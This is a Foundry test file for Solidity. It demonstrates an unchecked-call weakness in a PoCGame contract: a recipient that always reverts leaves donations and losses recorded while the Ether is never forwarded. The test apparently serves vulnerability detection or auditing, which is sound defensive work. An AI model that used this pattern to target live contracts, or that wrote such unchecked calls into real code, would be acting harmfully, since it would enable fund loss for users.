// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x07f7ecb66d788ab01dc93b9b71a88401de7d0f2e.sol";

contract RevertingWhale {
    fallback() external payable {
        revert("RevertingWhale: Ether transfers not allowed");
    }
}

contract UncheckedCallTest is Test {
    PoCGame game;
    RevertingWhale revertingWhale;
    uint256 constant WAGER_LIMIT = 1 ether;
    address constant PLAYER = address(0x123); // EOA address

    event Donate(uint256 amount, address whale, address sender);
    event Lose(uint256 amount, address sender);

    function setUp() public {
        revertingWhale = new RevertingWhale();
        game = new PoCGame(address(revertingWhale), WAGER_LIMIT);
        game.OpenToThePublic();
        game.AdjustDifficulty(2); // Set difficulty to 2 to force loss condition
    }

    function testUncheckedDonation() public {
        console.log("--- BEFORE-Trigger ---");
        uint256 initialWhaleBalance = address(revertingWhale).balance;
        uint256 initialGameBalance = address(game).balance;
        console.log("Game initial balance:", initialGameBalance);
        console.log("Whale initial balance:", initialWhaleBalance);

        uint256 donateAmount = 1 ether;
        vm.deal(PLAYER, donateAmount);

        console.log("--- Trigger Donate Operation ---");
        vm.prank(PLAYER);
        vm.expectEmit(true, true, true, true);
        emit Donate(donateAmount, address(revertingWhale), PLAYER);
        game.donate{value: donateAmount}();

        console.log("--- AFTER-Trigger ---");
        uint256 updatedWhaleBalance = address(revertingWhale).balance;
        uint256 updatedGameBalance = address(game).balance;
        console.log("Game updated balance:", updatedGameBalance);
        console.log("Whale updated balance:", updatedWhaleBalance);

        bool whaleUnchanged = updatedWhaleBalance == initialWhaleBalance;
        bool gameIncreased = updatedGameBalance == initialGameBalance + donateAmount;
        console.log("Whale unchanged:", whaleUnchanged);
        console.log("Game increased correctly:", gameIncreased);

        if (whaleUnchanged && gameIncreased) {
            console.log("Vulnerability Exists: Unchecked call allows state update without actual transfer");
        } else {
            console.log("Vulnerability not Exist: State changes inconsistent with vulnerability pattern");
        }
    }

    function testUncheckedLoseWager() public {
        // Pre-setup
        uint256 wagerAmount = WAGER_LIMIT;
        vm.deal(PLAYER, wagerAmount);
        vm.roll(100);

        console.log("--- BEFORE-Trigger ---");
        uint256 initialWhaleBalance = address(revertingWhale).balance;
        uint256 initialGameBalance = address(game).balance;
        console.log("Game initial balance:", initialGameBalance);
        console.log("Whale initial balance:", initialWhaleBalance);

        // Place wager
        vm.prank(PLAYER, PLAYER);
        game.wager{value: wagerAmount}();
        uint256 afterWagerBalance = address(game).balance;

        console.log("--- Trigger Play Operation ---");
        vm.roll(101);
        vm.prank(PLAYER, PLAYER);
        vm.expectEmit(true, true, true, true);
        emit Lose(wagerAmount / 2, PLAYER);
        game.play();

        console.log("--- AFTER-Trigger ---");
        uint256 updatedWhaleBalance = address(revertingWhale).balance;
        uint256 updatedGameBalance = address(game).balance;
        console.log("Game updated balance:", updatedGameBalance);
        console.log("Whale updated balance:", updatedWhaleBalance);

        bool whaleUnchanged = updatedWhaleBalance == initialWhaleBalance;
        bool gameUnchanged = updatedGameBalance == afterWagerBalance;
        console.log("Whale unchanged:", whaleUnchanged);
        console.log("Game unchanged:", gameUnchanged);

        if (whaleUnchanged && gameUnchanged) {
            console.log("Vulnerability Exists: Unchecked call allows skip whale transfer without state change");
        } else {
            console.log("Vulnerability not Exist: State changes inconsistent with vulnerability pattern");
        }
    }
}